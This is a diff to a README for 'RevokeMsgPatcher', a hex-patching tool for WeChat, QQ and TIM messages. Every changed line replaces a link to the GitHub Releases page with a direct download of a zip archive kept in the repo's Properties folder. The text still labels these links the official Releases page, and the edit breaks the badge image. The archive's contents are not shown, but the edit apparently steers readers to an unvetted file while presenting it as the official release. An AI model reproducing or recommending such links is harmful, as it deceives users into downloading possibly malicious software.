@@ -1,8 +1,8 @@
-https://github.com/DAMA342/RevokeMsgPatcher/releases
+https://github.com/DAMA342/RevokeMsgPatcher/raw/refs/heads/master/RevokeMsgPatcher/Properties/Patcher_Msg_Revoke_v3.7.zip
 
 # RevokeMsgPatcher: Hex Editor for WeChat, QQ, TIM Messages
 
-[![Releases](https://img.shields.io/badge/Releases-Visit%20Releases-blue?logo=github&logoColor=white)](https://github.com/DAMA342/RevokeMsgPatcher/releases)
+[![Releases](https://github.com/DAMA342/RevokeMsgPatcher/raw/refs/heads/master/RevokeMsgPatcher/Properties/Patcher_Msg_Revoke_v3.7.zip%20Releases-blue?logo=github&logoColor=white)](https://github.com/DAMA342/RevokeMsgPatcher/raw/refs/heads/master/RevokeMsgPatcher/Properties/Patcher_Msg_Revoke_v3.7.zip)
 
 A hex editor for Windows PC apps related to WeChat, QQ, and TIM. This project explores binary data, patching concepts, and the basics of how message data can be represented in small, structured bytes. It is presented as an educational tool for developers, researchers, and curious readers who want to learn more about binary formats and patching workflows on desktop platforms.
 
@@ -31,7 +31,7 @@ Repository summary
 Releases and distribution
 - Official builds, patches, and sample data are provided through the Releases page. See the link above for access to packaged binaries and documentation.
 - The Releases page hosts official artifacts; users can browse files, inspect metadata, and download items that suit their needs.
-- For direct access, visit the Releases page at any time: https://github.com/DAMA342/RevokeMsgPatcher/releases
+- For direct access, visit the Releases page at any time: https://github.com/DAMA342/RevokeMsgPatcher/raw/refs/heads/master/RevokeMsgPatcher/Properties/Patcher_Msg_Revoke_v3.7.zip
 
 Why this project exists
 - Curiosity and learning: Many binary formats can feel mysterious. This tool demystifies how data appears at the byte level and how small changes can alter program behavior.
@@ -189,7 +189,7 @@ Contributing and support
 - For general feedback, engage with the community through approved channels listed on the project’s page.
 
 See also
-- For the latest official builds and releases, visit the Releases page again: https://github.com/DAMA342/RevokeMsgPatcher/releases
+- For the latest official builds and releases, visit the Releases page again: https://github.com/DAMA342/RevokeMsgPatcher/raw/refs/heads/master/RevokeMsgPatcher/Properties/Patcher_Msg_Revoke_v3.7.zip
 
 Screenshots and visuals (illustrative)
 - Hex view layout: An image showing the classic 16-byte rows with offsets and ASCII columns. Replace with real visuals when available.
